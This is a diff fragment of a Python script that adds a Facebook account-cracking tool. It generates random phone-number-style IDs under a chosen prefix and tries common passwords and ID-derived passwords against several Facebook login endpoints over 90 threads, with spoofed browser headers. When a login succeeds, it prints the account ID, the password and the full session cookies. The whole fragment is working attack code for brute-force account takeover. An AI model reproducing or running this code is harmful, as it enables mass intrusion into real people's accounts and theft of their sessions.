+    print("                      [bold yellow]  ✓ [bold green]You Choosed "+code)
+    space()
+    space()
+    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000") 
+    limit=int(input("                        ✓ Choice ->"))
+    print("                      [yellow] [bold] ✓[bold green] Crack Limit ",limit)
+    print(cxx)
+    space()
+    for i in track(range(limit),description="      Dumping"):
+        numx=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(numx)
+    #dual("Dumping successful","y.mp3")
+    
+    with ThreadPool (max_workers=90) as feel:
+        logo()
+        print(Markdown("# CHOOSE MATHOD"))
+        space()
+        Mathi1=Tree("[bold white][A/1]")
+        Mathi1.add("M. FACEBOOK ")
+        print(Mathi1)
+        space()
+        Mathi2=Tree("[bold green][B/2]")
+        Mathi2.add("MBASIC. FACEBOOK ")
+        print(Mathi2)
+        space()
+        Mathi3=Tree("[bold blue][C/3]")
+        Mathi3.add("P. FACEBOOK ")
+        print(Mathi3)
+        space()
+        Mathi4=Tree("[bold yellow][D/4]")
+        Mathi4.add("X. FACEBOOK ")
+        print(Mathi4)
+        space() 
+        Mathi5=Tree("[bold red][E/5]")
+        Mathi5.add("FREE. FACEBOOK ")
+        print(Mathi5)
+        space()
+        Mathi6=Tree("[bold cyan][F/6]")
+        Mathi6.add("TOUCH. FACEBOOK ")
+        print(Mathi6)
+        space()
+        jbs=input("                [✓] choice:")
+        if jbs in ["1","A","a","01"]:
+            tsg="m"
+        elif jbs in ["2","B","b","02"]:
+            tsg="mbasic"
+        elif jbs in ["3","C","c","03"]:
+            tsg="p"
+        elif jbs in ["4","D","d","04"]:
+            tsg="x"
+        elif jbs in ["5","E","e","05"]:
+            tsg="free"
+        elif jbs in ["6","F","f","06"]:
+            tsg="touch"
+        else:
+            tsg="m"
+        logo()
+        tl=str(len(user))
+        tl_=Tree("[green]Total ID ")
+        tl_.add("[bold green]"+tl)
+        mathod=Tree("[blue]Mathod")
+        mathod.add("[bold blue]"+tsg)
+        
+        space()
+        print(n4)
+        space()
+        print_json(data=date)
+        space()
+        print(tl_)
+        space()
+        print(mathod)
+        print(Markdown("# Crack Started"))
+        space()
+        for i in user:
+            uid=code+i
+            fb=tsg
+            pwx = [code,'bangladesh','i love you','nusrat','shahin','fatema','hridoy','mababa','@@@###','@#@#@#','405060','708090','445566','778899']
+            pwx.append(uid[5:])#back 6
+            pwx.append(uid[4:])#back 7
+            pwx.append(uid[3:])#back 8
+            pwx.append(uid[:6])#front 6
+            pwx.append(uid[:7])#front 7
+            pwx.append(uid[:8])#front 8
+            pwx.append(uid)# 11
+            feel.submit(need,uid,pwx,fb,tl)
+
+
+
+def need(uid,pwx,fb,tl):
+    global ok,ugen,loop
+    session=requests.session()
+    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
+    sys.stdout.flush()
+    try:
+        for ps in pwx:
+            uuu=random.choice(ugen)
+            free_fb = session.get(f'https://{fb}.facebook.com').text
+            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
+            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
+            heron_brand=session.cookies.get_dict().keys()
+            if "c_user" in heron_brand:
+                hh=str(len(ok))
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                xx=coki.split("c_user=")[1]
+                xd=xx[:15]
+                print("\r\r\n\n")
+                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
+                #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
+                
+                ok.append(uid)
+                break
+            
+            else:
+                continue
+        loop+=1
+    except:
+        time.sleep(15)
+
+main()
